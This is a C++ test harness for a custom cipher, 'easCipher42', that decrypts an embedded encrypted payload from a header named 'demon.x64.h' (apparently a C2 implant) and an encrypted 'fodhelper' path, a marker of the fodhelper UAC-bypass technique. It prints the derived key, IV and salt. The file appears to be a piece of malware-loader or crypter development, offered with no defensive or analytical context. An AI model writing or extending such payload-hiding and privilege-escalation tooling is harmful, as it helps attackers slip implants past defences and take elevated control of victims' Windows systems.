#include <iostream>
#include <vector>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "demon.x64.h"

int main() {
    std::cout << "=== easCipher42 TEST ===\n";
    
    // Affichage myenc.py style
    std::cout << "[+] payload_enc: " << payload_enc_len << "b [";
    std::cout << bytes_to_hex(payload_enc, 8) << "..." << bytes_to_hex(payload_enc + payload_enc_len - 8, 8) << "]\n";
    
    std::cout << "[+] fodhelper_enc: " << fodhelper_enc_len << "b [";
    std::cout << bytes_to_hex(fodhelper_enc, 8) << "..." << bytes_to_hex(fodhelper_enc + fodhelper_enc_len - 8, 8) << "]\n\n";
    
    // 1. Extraire seed → derive key/iv/salt
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Init FAILED\n"; return -1;
    }
    
    // Logs comme myenc.py
    std::cout << "[+] seed (42 bytes): " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
    std::cout << "[+] salt (dyn): " << bytes_to_hex(cipher.GetSalt(), 16) << "\n";
    std::cout << "[+] key (aes256): " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
    std::cout << "[+] iv (cbc): " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    
    // 2. Stocker fodhelper PUR
    cipher.SetFodhelper(fodhelper_enc, fodhelper_enc_len);
    
    // 3. Decrypt fodhelper
    std::vector<uint8_t> fodpath;
    if (cipher.Decrypt(cipher.GetFodhelperEnc(), cipher.GetFodhelperEncLen(), fodpath)) {
        std::cout << "[+] fodhelper PATH: ";
        for (auto c : fodpath) std::cout << (char)c;
        std::cout << "\n";
    } else {
        std::cout << "[-] FODHELPER FAILED\n";
    }
    
    return 0;
}
